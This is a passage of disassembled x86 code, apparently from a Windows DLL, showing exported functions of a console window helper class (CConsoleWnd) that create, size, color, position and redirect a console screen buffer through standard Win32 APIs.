					; Ordinal516+3Cj
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi

loc_6AF3E8E5:				; CODE XREF: Ordinal516+95j
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal516	endp

; Exported entry 517.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal517
Ordinal517	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		mov	ebx, ecx
		xor	esi, esi
		push	esi
		push	0FFFFFFFFh
		lea	eax, [ebx+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [ebx+8]
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF3E925
		push	offset aCconsolewndRed ; "CConsoleWnd::RedirectIO() : m_hScreenBu"...
		call	sub_6AF3102E

loc_6AF3E91F:				; CODE XREF: Ordinal517+84j
		pop	ecx
		jmp	loc_6AF3E9A6
; ---------------------------------------------------------------------------

loc_6AF3E925:				; CODE XREF: Ordinal517+21j
		push	eax		; hHandle
		push	0FFFFFFF5h	; nStdHandle
		call	ds:SetStdHandle
		mov	eax, [ebx+4]
		cmp	eax, esi
		jz	short loc_6AF3E940
		push	eax		; File
		call	ds:fclose
		pop	ecx
		mov	[ebx+4], esi

loc_6AF3E940:				; CODE XREF: Ordinal517+41j
		push	4000h		; int
		push	dword ptr [ebx+8] ; __int32
		call	ds:_open_osfhandle
		push	offset aW	; "w"
		push	eax		; FileHandle
		call	ds:_fdopen
		add	esp, 10h
		cmp	eax, esi
		mov	[ebx+4], eax
		jnz	short loc_6AF3E978
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndR_0 ; "CConsoleWnd::RedirectIO() : m_pOutputSt"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3E91F
; ---------------------------------------------------------------------------

loc_6AF3E978:				; CODE XREF: Ordinal517+70j
		push	edi
		mov	edi, ds:_iob
		push	8
		add	edi, 20h
		pop	ecx
		mov	esi, eax
		rep movsd
		mov	edi, ds:_iob
		mov	esi, [ebx+4]
		push	8
		add	edi, 40h
		pop	ecx
		rep movsd
		xor	esi, esi
		inc	esi
		push	esi
		call	ds:?sync_with_stdio@ios_base@std@@SA_N_N@Z ; std::ios_base::sync_with_stdio(bool)
		pop	ecx
		pop	edi

loc_6AF3E9A6:				; CODE XREF: Ordinal517+2Ej
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal517	endp

; Exported entry 520.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal520
Ordinal520	proc near		; DATA XREF: .rdata:off_6AF66098o

ConsoleScreenBufferInfo= _CONSOLE_SCREEN_BUFFER_INFO ptr -24h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		xor	ebx, ebx
		mov	edi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [edi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[esi], ebx
		mov	[esi+4], ebx
		call	Ordinal1228
		mov	edi, [edi+8]
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_6AF3E9ED
		push	offset aCconsolewndGet ; "CConsoleWnd::GetPosition() : m_hScreenB"...
		call	sub_6AF3102E

loc_6AF3E9EA:				; CODE XREF: Ordinal520+5Aj
		pop	ecx
		jmp	short loc_6AF3EA20
; ---------------------------------------------------------------------------

loc_6AF3E9ED:				; CODE XREF: Ordinal520+2Aj
		lea	eax, [ebp+ConsoleScreenBufferInfo]
		push	eax		; lpConsoleScreenBufferInfo
		push	edi		; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3EA10
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndG_0 ; "CConsoleWnd::GetPosition() : GetConsole"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3E9EA
; ---------------------------------------------------------------------------

loc_6AF3EA10:				; CODE XREF: Ordinal520+46j
		movsx	eax, [ebp+ConsoleScreenBufferInfo.dwCursorPosition.X]
		mov	[esi], eax
		movsx	eax, [ebp+ConsoleScreenBufferInfo.dwCursorPosition.Y]
		xor	ebx, ebx
		mov	[esi+4], eax
		inc	ebx

loc_6AF3EA20:				; CODE XREF: Ordinal520+37j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	4
Ordinal520	endp

; Exported entry 521.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal521(COORD dwCursorPosition)
		public Ordinal521
Ordinal521	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
dwCursorPosition= COORD	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+8]
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_6AF3EA61
		push	offset aCconsolewndSet ; "CConsoleWnd::SetPosition() : m_hScreenB"...
		call	sub_6AF3102E
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3EA7F
; ---------------------------------------------------------------------------

loc_6AF3EA61:				; CODE XREF: Ordinal521+1Fj
		mov	eax, dword ptr [ebp+dwCursorPosition.X]
		mov	cx, [eax]
		mov	ax, [eax+4]
		mov	[ebp+dwCursorPosition.X], cx
		mov	[ebp+dwCursorPosition.Y], ax
		push	dword ptr [ebp+dwCursorPosition.X] ; dwCursorPosition
		push	esi		; hConsoleOutput
		call	ds:SetConsoleCursorPosition
		mov	esi, eax

loc_6AF3EA7F:				; CODE XREF: Ordinal521+2Ej
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal521	endp

; Exported entry 522.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal522
Ordinal522	proc near		; DATA XREF: .rdata:off_6AF66098o

ConsoleScreenBufferInfo= _CONSOLE_SCREEN_BUFFER_INFO ptr -24h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		xor	ebx, ebx
		mov	edi, ecx
		push	ebx
		push	0FFFFFFFFh
		lea	eax, [edi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		mov	[esi], ebx
		mov	[esi+4], ebx
		call	Ordinal1228
		mov	edi, [edi+8]
		cmp	edi, 0FFFFFFFFh
		jnz	short loc_6AF3EAC7
		push	offset aCconsolewndG_1 ; "CConsoleWnd::GetSize() : m_hScreenBuffe"...
		call	sub_6AF3102E

loc_6AF3EAC4:				; CODE XREF: Ordinal522+5Aj
		pop	ecx
		jmp	short loc_6AF3EAFA
; ---------------------------------------------------------------------------

loc_6AF3EAC7:				; CODE XREF: Ordinal522+2Aj
		lea	eax, [ebp+ConsoleScreenBufferInfo]
		push	eax		; lpConsoleScreenBufferInfo
		push	edi		; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3EAEA
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndG_2 ; "CConsoleWnd::GetSize() : GetConsoleScre"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3EAC4
; ---------------------------------------------------------------------------

loc_6AF3EAEA:				; CODE XREF: Ordinal522+46j
		movsx	eax, [ebp+ConsoleScreenBufferInfo.dwSize.X]
		mov	[esi], eax
		movsx	eax, [ebp+ConsoleScreenBufferInfo.dwSize.Y]
		xor	ebx, ebx
		mov	[esi+4], eax
		inc	ebx

loc_6AF3EAFA:				; CODE XREF: Ordinal522+37j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		mov	eax, ebx
		pop	ebx
		leave
		retn	4
Ordinal522	endp

; Exported entry 523.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal523
Ordinal523	proc near		; DATA XREF: .rdata:off_6AF66098o

ConsoleScreenBufferInfo= _CONSOLE_SCREEN_BUFFER_INFO ptr -24h
var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+8]
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF3EB3B
		push	offset aCconsolewndS_0 ; "CConsoleWnd::SetSize() : m_hScreenBuffe"...
		call	sub_6AF3102E

loc_6AF3EB36:				; CODE XREF: Ordinal523+51j
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3EB7E
; ---------------------------------------------------------------------------

loc_6AF3EB3B:				; CODE XREF: Ordinal523+1Fj
		lea	ecx, [ebp+ConsoleScreenBufferInfo]
		push	ecx		; lpConsoleScreenBufferInfo
		push	eax		; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3EB5E
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndS_1 ; "CConsoleWnd::SetSize() : GetConsoleScre"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3EB36
; ---------------------------------------------------------------------------

loc_6AF3EB5E:				; CODE XREF: Ordinal523+3Dj
		mov	eax, [ebp+arg_0]
		mov	cx, [eax]
		mov	ax, [eax+4]
		mov	[ebp+ConsoleScreenBufferInfo.dwSize.X],	cx
		mov	[ebp+ConsoleScreenBufferInfo.dwSize.Y],	ax
		push	dword ptr [ebp+ConsoleScreenBufferInfo.dwSize.X] ; dwSize
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:SetConsoleScreenBufferSize
		mov	esi, eax

loc_6AF3EB7E:				; CODE XREF: Ordinal523+2Ej
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal523	endp

; Exported entry 524.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal524(WORD	wAttribute, COORD dwWriteCoord)
		public Ordinal524
Ordinal524	proc near		; DATA XREF: .rdata:off_6AF66098o

ConsoleScreenBufferInfo= _CONSOLE_SCREEN_BUFFER_INFO ptr -28h
var_10		= byte ptr -10h
NumberOfAttrsWritten= dword ptr	-4
wAttribute	= word ptr  8
dwWriteCoord	= COORD	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_10]
		call	Ordinal1228
		mov	eax, [esi+8]
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF3EBBD
		push	offset aCconsolewndS_2 ; "CConsoleWnd::SetDefaultColors() : m_hSc"...
		call	sub_6AF3102E

loc_6AF3EBB8:				; CODE XREF: Ordinal524+75j
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3EC37
; ---------------------------------------------------------------------------

loc_6AF3EBBD:				; CODE XREF: Ordinal524+1Fj
		push	dword ptr [ebp+wAttribute] ; wAttributes
		push	eax		; hConsoleOutput
		call	ds:SetConsoleTextAttribute
		test	eax, eax
		jnz	short loc_6AF3EBD9
		call	ds:GetLastError
		push	eax
		push	offset aCconsolewndS_3 ; "CConsoleWnd::SetDefaultColors() : SetCo"...
		jmp	short loc_6AF3EBFC
; ---------------------------------------------------------------------------

loc_6AF3EBD9:				; CODE XREF: Ordinal524+3Cj
		cmp	dword ptr [ebp+dwWriteCoord.X],	0
		jz	short loc_6AF3EC34
		lea	eax, [ebp+ConsoleScreenBufferInfo]
		push	eax		; lpConsoleScreenBufferInfo
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:GetConsoleScreenBufferInfo
		test	eax, eax
		jnz	short loc_6AF3EC04
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndS_4 ; "CConsoleWnd::SetDefaultColors() : GetCo"...

loc_6AF3EBFC:				; CODE XREF: Ordinal524+4Aj
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3EBB8
; ---------------------------------------------------------------------------

loc_6AF3EC04:				; CODE XREF: Ordinal524+61j
		movsx	ecx, [ebp+ConsoleScreenBufferInfo.dwSize.X]
		movsx	eax, [ebp+ConsoleScreenBufferInfo.dwSize.Y]
		and	[ebp+dwWriteCoord.X], 0
		imul	eax, ecx
		and	[ebp+dwWriteCoord.Y], 0
		lea	ecx, [ebp+NumberOfAttrsWritten]
		push	ecx		; lpNumberOfAttrsWritten
		push	dword ptr [ebp+dwWriteCoord.X] ; dwWriteCoord
		mov	[ebp+NumberOfAttrsWritten], eax
		push	eax		; nLength
		push	dword ptr [ebp+wAttribute] ; wAttribute
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:FillConsoleOutputAttribute
		mov	esi, eax
		jmp	short loc_6AF3EC37
; ---------------------------------------------------------------------------

loc_6AF3EC34:				; CODE XREF: Ordinal524+50j
		xor	esi, esi
		inc	esi

loc_6AF3EC37:				; CODE XREF: Ordinal524+2Ej
					; Ordinal524+A5j
		lea	ecx, [ebp+var_10]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal524	endp

; Exported entry 525.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal525
Ordinal525	proc near		; DATA XREF: .rdata:off_6AF66098o

var_14		= byte ptr -14h
ConsoleCursorInfo= _CONSOLE_CURSOR_INFO	ptr -8
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	eax, [esi+8]
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF3EC76
		push	offset aCconsolewndS_5 ; "CConsoleWnd::SetCursorVisible() : m_hSc"...
		call	sub_6AF3102E

loc_6AF3EC71:				; CODE XREF: Ordinal525+51j
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3ECAE
; ---------------------------------------------------------------------------

loc_6AF3EC76:				; CODE XREF: Ordinal525+1Fj
		lea	ecx, [ebp+ConsoleCursorInfo]
		push	ecx		; lpConsoleCursorInfo
		push	eax		; hConsoleOutput
		call	ds:GetConsoleCursorInfo
		test	eax, eax
		jnz	short loc_6AF3EC99
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndS_6 ; "CConsoleWnd::SetCursorVisible() : GetCo"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3EC71
; ---------------------------------------------------------------------------

loc_6AF3EC99:				; CODE XREF: Ordinal525+3Dj
		mov	eax, [ebp+arg_0]
		mov	[ebp+ConsoleCursorInfo.bVisible], eax
		lea	eax, [ebp+ConsoleCursorInfo]
		push	eax		; lpConsoleCursorInfo
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:SetConsoleCursorInfo
		mov	esi, eax

loc_6AF3ECAE:				; CODE XREF: Ordinal525+2Ej
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal525	endp

; Exported entry 526.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal526
Ordinal526	proc near		; DATA XREF: .rdata:off_6AF66098o

var_14		= byte ptr -14h
ConsoleCursorInfo= _CONSOLE_CURSOR_INFO	ptr -8

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_14]
		call	Ordinal1228
		mov	esi, [esi+8]
		cmp	esi, 0FFFFFFFFh
		jnz	short loc_6AF3ECED
		push	offset aCconsolewndG_3 ; "CConsoleWnd::GetCursorVisible() : m_hSc"...
		call	sub_6AF3102E

loc_6AF3ECE8:				; CODE XREF: Ordinal526+51j
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3ED13
; ---------------------------------------------------------------------------

loc_6AF3ECED:				; CODE XREF: Ordinal526+1Fj
		lea	eax, [ebp+ConsoleCursorInfo]
		push	eax		; lpConsoleCursorInfo
		push	esi		; hConsoleOutput
		call	ds:GetConsoleCursorInfo
		test	eax, eax
		jnz	short loc_6AF3ED10
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndG_4 ; "CConsoleWnd::GetCursorVisible() : GetCo"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3ECE8
; ---------------------------------------------------------------------------

loc_6AF3ED10:				; CODE XREF: Ordinal526+3Dj
		mov	esi, [ebp+ConsoleCursorInfo.bVisible]

loc_6AF3ED13:				; CODE XREF: Ordinal526+2Ej
		lea	ecx, [ebp+var_14]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal526	endp

; Exported entry 529.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal529
Ordinal529	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		xor	eax, eax
		cmp	dword ptr [esi+8], 0FFFFFFFFh
		lea	ecx, [ebp+var_C]
		setnz	al
		mov	esi, eax
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal529	endp

; Exported entry 530.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal530
Ordinal530	proc near		; CODE XREF: Ordinal512+29p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	edi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [edi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		push	0FFFFFFF5h	; nStdHandle
		call	ds:GetStdHandle
		mov	esi, eax
		sub	esi, [edi+8]
		lea	ecx, [ebp+var_C]
		neg	esi
		sbb	esi, esi
		inc	esi
		call	Ordinal1230
		pop	edi
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal530	endp

; Exported entry 531.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal531
Ordinal531	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+8]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal531	endp

; Exported entry 509.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal509(int,	DWORD dwMode)
		public Ordinal509
Ordinal509	proc near		; CODE XREF: Ordinal510j
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8
dwMode		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, esi
		call	Ordinal511
		push	0		; lpScreenBufferData
		push	1		; dwFlags
		push	0		; lpSecurityAttributes
		push	3		; dwShareMode
		push	0C0000000h	; dwDesiredAccess
		call	ds:CreateConsoleScreenBuffer
		cmp	eax, 0FFFFFFFFh
		mov	[esi+8], eax
		jnz	short loc_6AF3EE09
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndCre ; "CConsoleWnd::Create()	: CreateConsoleSc"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx

loc_6AF3EE02:				; CODE XREF: Ordinal509+7Dj
		xor	esi, esi
		jmp	loc_6AF3EE93
; ---------------------------------------------------------------------------

loc_6AF3EE09:				; CODE XREF: Ordinal509+39j
		push	[ebp+dwMode]	; dwMode
		push	eax		; hConsoleHandle
		call	ds:SetConsoleMode
		test	eax, eax
		jnz	short loc_6AF3EE33
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndC_2 ; "CConsoleWnd::Create()	: SetConsoleMode("...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	ecx, esi
		call	Ordinal511
		jmp	short loc_6AF3EE02
; ---------------------------------------------------------------------------

loc_6AF3EE33:				; CODE XREF: Ordinal509+61j
		push	edi
		mov	edi, [ebp+arg_0]
		test	edi, edi
		jz	short loc_6AF3EE8F
		push	dword ptr [edi]	; dwSize
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:SetConsoleScreenBufferSize
		test	eax, eax
		jz	short loc_6AF3EE71
		xor	eax, eax
		mov	ax, [edi+8]
		push	eax		; wAttributes
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:SetConsoleTextAttribute
		test	eax, eax
		jz	short loc_6AF3EE71
		add	edi, 0Ah
		push	edi		; lpConsoleWindow
		push	1		; bAbsolute
		push	dword ptr [esi+8] ; hConsoleOutput
		call	ds:SetConsoleWindowInfo
		test	eax, eax
		jnz	short loc_6AF3EE8F

loc_6AF3EE71:				; CODE XREF: Ordinal509+94j
					; Ordinal509+A8j
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndC_3 ; "CConsoleWnd::Create()	: SetConsoleScree"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	ecx, esi
		call	Ordinal511
		xor	esi, esi
		jmp	short loc_6AF3EE92
; ---------------------------------------------------------------------------

loc_6AF3EE8F:				; CODE XREF: Ordinal509+85j
					; Ordinal509+BBj
		xor	esi, esi
		inc	esi

loc_6AF3EE92:				; CODE XREF: Ordinal509+D9j
		pop	edi

loc_6AF3EE93:				; CODE XREF: Ordinal509+50j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal509	endp

; Exported entry 510.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal510
Ordinal510	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal509
Ordinal510	endp

; Exported entry 528.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal528
Ordinal528	proc near		; CODE XREF: Ordinal514+57p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	esi, [esi+0Ch]
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn
Ordinal528	endp

; Exported entry 514.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal514
Ordinal514	proc near		; CODE XREF: Ordinal512+43p
					; Ordinal905+63p
					; DATA XREF: ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	eax, [esi+8]
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_6AF3EF00
		push	offset aCconsolewndAct ; "CConsoleWnd::Activate() : m_hScreenBuff"...
		call	sub_6AF3102E

loc_6AF3EEFB:				; CODE XREF: Ordinal514+4Dj
		pop	ecx
		xor	esi, esi
		jmp	short loc_6AF3EF3C
; ---------------------------------------------------------------------------

loc_6AF3EF00:				; CODE XREF: Ordinal514+1Fj
		push	eax		; hConsoleOutput
		call	ds:SetConsoleActiveScreenBuffer
		test	eax, eax
		jnz	short loc_6AF3EF1F
		call	ds:GetLastError
		push	eax		; Args
		push	offset aCconsolewndA_0 ; "CConsoleWnd::Activate() : SetConsoleAct"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3EEFB
; ---------------------------------------------------------------------------

loc_6AF3EF1F:				; CODE XREF: Ordinal514+39j
		cmp	[ebp+arg_0], 0
		jz	short loc_6AF3EF39
		mov	ecx, esi
		call	Ordinal528
		mov	ecx, [ebp+arg_0]
		push	eax		; lpString2
		call	Ordinal482
		mov	esi, eax
		jmp	short loc_6AF3EF3C
; ---------------------------------------------------------------------------

loc_6AF3EF39:				; CODE XREF: Ordinal514+53j
		xor	esi, esi
		inc	esi

loc_6AF3EF3C:				; CODE XREF: Ordinal514+2Ej
					; Ordinal514+67j
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		pop	esi
		leave
		retn	4
Ordinal514	endp

; Exported entry 501.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal501
Ordinal501	proc near		; CODE XREF: Ordinal1072+55p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		or	dword ptr [esi+8], 0FFFFFFFFh
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF5A00C
		call	sub_6AF318C3
		lea	ecx, [esi+10h]
		call	Ordinal1278
		mov	eax, esi
		pop	esi
		retn
Ordinal501	endp

; Exported entry 502.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal502
Ordinal502	proc near		; CODE XREF: sub_6AF3EFF2+3p
					; Ordinal1073+Fp
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5A00C
		call	Ordinal511
		lea	ecx, [esi+10h]
		call	Ordinal1279
		lea	ecx, [esi+0Ch]
		pop	esi
		jmp	sub_6AF3789B
Ordinal502	endp

; Exported entry 512.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal512
Ordinal512	proc near		; CODE XREF: Ordinal1096+37p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		cmp	edi, 0FFFFFFFFh
		mov	esi, ecx
		jz	short loc_6AF3EFEA
		test	edi, edi
		jz	short loc_6AF3EFEA
		push	ebx
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+10h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	ecx, esi
		call	Ordinal530
		mov	ecx, esi
		mov	ebx, eax
		call	Ordinal511
		test	ebx, ebx
		mov	[esi+8], edi
		pop	ebx
		jz	short loc_6AF3EFDB
		push	0
		mov	ecx, esi
		call	Ordinal514
		mov	esi, eax
		jmp	short loc_6AF3EFDE
; ---------------------------------------------------------------------------

loc_6AF3EFDB:				; CODE XREF: Ordinal512+3Dj
		xor	esi, esi
		inc	esi

loc_6AF3EFDE:				; CODE XREF: Ordinal512+4Aj
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		mov	eax, esi
		jmp	short loc_6AF3EFEC
; ---------------------------------------------------------------------------

loc_6AF3EFEA:				; CODE XREF: Ordinal512+10j
					; Ordinal512+14j
		xor	eax, eax

loc_6AF3EFEC:				; CODE XREF: Ordinal512+59j
		pop	edi
		pop	esi
		leave
		retn	4
Ordinal512	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF3EFF2(void *, char)
sub_6AF3EFF2	proc near		; DATA XREF: .rdata:off_6AF5A00Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal502
		test	[esp+4+arg_0], 1
		jz	short loc_6AF3F008
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF3F008:				; CODE XREF: sub_6AF3EFF2+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3EFF2	endp

; Exported entry 519.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal519(char	*Format, va_list Args)
		public Ordinal519
Ordinal519	proc near		; CODE XREF: Ordinal518+Dp
					; DATA XREF: .rdata:off_6AF66098o

var_64		= byte ptr -64h
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= byte ptr -50h
var_30		= dword	ptr -30h
NumberOfCharsWritten= dword ptr	-2Ch
lpBuffer	= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
Format		= dword	ptr  8
Args		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_68 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 58h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
